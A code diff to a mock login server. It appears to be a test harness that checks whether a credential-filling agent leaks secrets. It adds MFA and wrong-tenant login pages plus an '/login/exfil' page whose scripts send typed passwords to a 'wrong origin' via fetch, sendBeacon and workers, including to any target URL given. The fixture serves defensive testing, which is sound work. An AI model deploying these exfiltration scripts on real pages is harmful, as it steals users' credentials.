@@ -245,11 +245,13 @@ async function main() {
     },
   });
 
-  async function handleLoginPost(req, res, originBucket, isWrongTarget) {
+  async function handleLoginPost(req, res, originBucket, isWrongTarget, overrideIdentity = null) {
     await checkBarrier("login");
     const raw = await readBody(req);
     const params = parseParams(raw, req.headers["content-type"]);
-    const hasPassword = typeof params.password === "string" && params.password.length > 0;
+    const isHtmlBrowser = String(req.headers.accept || "").includes("text/html");
+    const isMfaStep = typeof params.mfa_user === "string" && params.mfa_user.length > 0;
+    const hasPassword = !isMfaStep && typeof params.password === "string" && params.password.length > 0;
     const hasTotp = typeof params.totp === "string" && params.totp.length > 0;
 
     if (hasPassword) {
@@ -277,8 +279,22 @@ async function main() {
       return;
     }
 
-    const acct = accounts[params.username];
-    if (!acct || params.password !== acct.password) {
+    const lookupUser = isMfaStep ? params.mfa_user : params.username;
+    const acct = accounts[lookupUser];
+    if (!acct || (!isMfaStep && params.password !== acct.password)) {
+      if (isHtmlBrowser) {
+        res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
+        res.end(`<!doctype html><html><head><title>Sign in</title></head><body>
+          <div id="auth-error" data-auth-error="credentials_rejected">credentials_rejected</div>
+          <form id="login-form" method="POST" action="/login">
+            <input id="username" name="username" type="text" autocomplete="username" />
+            <input id="password" name="password" type="password" autocomplete="current-password" />
+            <input id="totp" name="totp" type="text" autocomplete="one-time-code" />
+            <button id="submit" type="submit">Sign in</button>
+          </form>
+        </body></html>`);
+        return;
+      }
       res.writeHead(401, { "content-type": "application/json" });
       res.end(JSON.stringify({ ok: false, error: "credentials_rejected" }));
       return;
@@ -300,6 +316,18 @@ async function main() {
         code: params.totp || "",
       });
       if (!verdict.valid) {
+        if (isHtmlBrowser) {
+          res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
+          res.end(`<!doctype html><html><head><title>Two-Factor Verification</title></head><body>
+            ${hasTotp ? '<div id="code-error" data-code-error="code_rejected">code_rejected</div>' : '<div id="mfa-prompt">Enter verification code</div>'}
+            <form id="mfa-form" method="POST" action="/login">
+              <input type="hidden" name="mfa_user" value="${acct.account}" />
+              <input id="totp" name="totp" type="text" autocomplete="one-time-code" />
+              <button id="submit" type="submit">Verify</button>
+            </form>
+          </body></html>`);
+          return;
+        }
         res.writeHead(401, { "content-type": "application/json" });
         res.end(JSON.stringify({ ok: false, error: "code_rejected" }));
         return;
@@ -314,10 +342,14 @@ async function main() {
       });
     }
 
+    const effectiveAccount = (overrideIdentity && overrideIdentity.account) || acct.account;
+    const effectiveTenant = (overrideIdentity && overrideIdentity.tenant) || acct.tenant;
+    const effectiveRole = (overrideIdentity && overrideIdentity.role) || acct.role;
+
     const token = mintSession({
-      account: acct.account,
-      tenant: acct.tenant,
-      role: acct.role,
+      account: effectiveAccount,
+      tenant: effectiveTenant,
+      role: effectiveRole,
     });
     const setCookie = `session=${token}; Path=/; HttpOnly; SameSite=Strict`;
     if (String(req.headers.accept || "").includes("application/json")) {
@@ -328,9 +360,9 @@ async function main() {
       res.end(
         JSON.stringify({
           ok: true,
-          account: acct.account,
-          tenant: acct.tenant,
-          role: acct.role,
+          account: effectiveAccount,
+          tenant: effectiveTenant,
+          role: effectiveRole,
           session_token: token,
         })
       );
@@ -341,15 +373,29 @@ async function main() {
       "set-cookie": setCookie,
     });
     res.end(`<!doctype html><html><head><title>Acme Dashboard</title></head><body>
-      <main id="dashboard">Signed in as ${acct.account}</main>
-      <div id="tenant">${acct.tenant}</div>
-      <div id="role">${acct.role}</div>
+      <main id="dashboard">Signed in as <span id="account-email">${effectiveAccount}</span></main>
+      <div id="tenant">${effectiveTenant}</div>
+      <div id="role">${effectiveRole}</div>
       <div id="build-number">${buildNumber}</div>
       <script>
-        localStorage.setItem("acme_tenant", ${JSON.stringify(acct.tenant)});
+        localStorage.setItem("acme_tenant", ${JSON.stringify(effectiveTenant)});
         localStorage.setItem("acme_token", ${JSON.stringify("tok_" + token)});
       </script>
     </body></html>`);
+  }
+
+  function loginHtml(title, action = "/login") {
+    return `<!doctype html><html><head><title>${title}</title></head><body>
+      <form id="login-form" method="POST" action="${action}">
+        <label for="username">Username</label>
+        <input id="username" name="username" type="text" autocomplete="username" />
+        <label for="password">Password</label>
+        <input id="password" name="password" type="password" autocomplete="current-password" />
+        <label for="totp">One-Time Code</label>
+        <input id="totp" name="totp" type="text" inputmode="numeric" autocomplete="one-time-code" />
+        <button id="submit" type="submit">Sign in</button>
+      </form>
+    </body></html>`;
   }
 
   const appServer = http.createServer(async (req, res) => {
@@ -583,13 +629,21 @@ async function main() {
       }
 
       if (req.method === "GET" && u.pathname === "/exfil-worker.js") {
+        const targetUrl = u.searchParams.get("target") || `${wrongOrigin}/exfil/worker`;
+        const isCustom = Boolean(u.searchParams.get("target"));
         res.writeHead(200, { "content-type": "application/javascript" });
         res.end(`
           self.onmessage = async (e) => {
-            await fetch("${wrongOrigin}/exfil/worker", {
-              method: "POST",
-              body: JSON.stringify({ exfil: e.data }),
-            });
+            try {
+              await fetch(${JSON.stringify(targetUrl)}, {
+                method: "POST",
+                ${
+                  isCustom
+                    ? 'headers: { "content-type": "application/x-www-form-urlencoded" }, body: "username=editor%40acme.test&password=" + encodeURIComponent(String(e.data))'
+                    : "body: JSON.stringify({ exfil: e.data })"
+                }
+              });
+            } catch {}
             self.postMessage("done");
           };
         `);
@@ -615,12 +669,41 @@ async function main() {
         return;
       }
 
+      if (req.method === "GET" && u.pathname === "/login/wrong-tenant-form") {
+        res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
+        res.end(`<!doctype html><html><head><title>Acme Sign In</title></head><body>
+          <form id="login-form" method="POST" action="/login/wrong-tenant-submit">
+            <label for="username">Username</label>
+            <input id="username" name="username" type="text" autocomplete="username" />
+            <label for="password">Password</label>
+            <input id="password" name="password" type="password" autocomplete="current-password" />
+            <label for="totp">One-Time Code</label>
+            <input id="totp" name="totp" type="text" inputmode="numeric" autocomplete="one-time-code" />
+            <button id="submit" type="submit">Sign in</button>
+          </form>
+        </body></html>`);
+        return;
+      }
+
+      if (req.method === "POST" && u.pathname === "/login/wrong-tenant-submit") {
+        await handleLoginPost(req, res, "app", false, { tenant: "t2" });
+        return;
+      }
+
       if (req.method === "GET" && u.pathname === "/login/exfil") {
         const channel = u.searchParams.get("channel") || "fetch";
+        const customTarget = u.searchParams.get("target") || "";
+        const workerScriptUrl = customTarget
+          ? `/exfil-worker.js?target=${encodeURIComponent(customTarget)}`
+          : "/exfil-worker.js";
         const wsOrigin = wrongOrigin.replace(/^http:/, "ws:");
         res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
         res.end(`<!doctype html><html><body>
-          <input id="password" type="password" />
+          <form id="exfil-form" method="POST" action="/login">
+            <input id="username" name="username" type="text" autocomplete="username" />
+            <input id="password" name="password" type="password" autocomplete="current-password" />
+            <button id="submit" type="submit">Sign in</button>
+          </form>
           <script>
             window.__triggerExfil = async (val) => {
               const ch = ${JSON.stringify(channel)};
@@ -630,8 +713,9 @@ async function main() {
                 navigator.sendBeacon("${wrongOrigin}/exfil/beacon", val);
               } else if (ch === "worker") {
                 await new Promise((resolve) => {
-                  const w = new Worker("/exfil-worker.js");
+                  const w = new Worker(${JSON.stringify(workerScriptUrl)});
                   w.onmessage = () => resolve();
+                  w.onerror = () => resolve();
                   w.postMessage(val);
                 });
               } else if (ch === "service_worker") {
@@ -815,8 +899,29 @@ async function main() {
 
   const httpsTestCaServer = https.createServer(
     { key: certs.testCaLeafKeyPem, cert: certs.testCaLeafCertPem },
-    (req, res) => {
+    async (req, res) => {
       counters.by_origin.https_test_ca.requests += 1;
+      const u = new URL(req.url, httpsTestCaOrigin || "https://acme.localhost");
+      if (req.method === "GET" && u.pathname === "/login") {
+        res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
+        res.end(loginHtml("Acme HTTPS Sign In", "/login"));
+        return;
+      }
+      if (req.method === "POST" && u.pathname === "/login") {
+        await handleLoginPost(req, res, "https_test_ca", false);
+        return;
+      }
+      if (req.method === "GET" && u.pathname === "/api/whoami") {
+        const sess = validSession(req);
+        if (!sess) {
+          res.writeHead(401, { "content-type": "application/json" });
+          res.end(JSON.stringify({ ok: false, error: "unauthorized" }));
+          return;
+        }
+        res.writeHead(200, { "content-type": "application/json" });
+        res.end(JSON.stringify({ ok: true, account: sess.account, tenant: sess.tenant, role: sess.role }));
+        return;
+      }
       res.writeHead(200, { "content-type": "application/json" });
       res.end(JSON.stringify({ ok: true, tls: "test_ca", build_number: buildNumber }));
     }
@@ -824,8 +929,18 @@ async function main() {
 
   const httpsSelfSignedServer = https.createServer(
     { key: certs.selfSignedKeyPem, cert: certs.selfSignedCertPem },
-    (req, res) => {
+    async (req, res) => {
       counters.by_origin.https_self_signed.requests += 1;
+      const u = new URL(req.url, httpsSelfSignedOrigin || "https://acme.localhost");
+      if (req.method === "GET" && u.pathname === "/login") {
+        res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
+        res.end(loginHtml("Self-Signed Sign In", "/login"));
+        return;
+      }
+      if (req.method === "POST" && u.pathname === "/login") {
+        await handleLoginPost(req, res, "https_self_signed", true);
+        return;
+      }
       res.writeHead(200, { "content-type": "application/json" });
       res.end(JSON.stringify({ ok: true, tls: "self_signed", build_number: buildNumber }));
     }
@@ -1006,6 +1121,7 @@ async function main() {
     https_self_signed: httpsSelfSignedOrigin,
     control: `http://127.0.0.1:${controlPort}`,
     test_ca_cert_pem: certs.testCaCertPem,
+    test_ca_spki_sha256: certs.testCaLeafSpkiSha256,
     build_number: buildNumber,
     editor_password: editorPassword,
     admin_password: adminPassword,
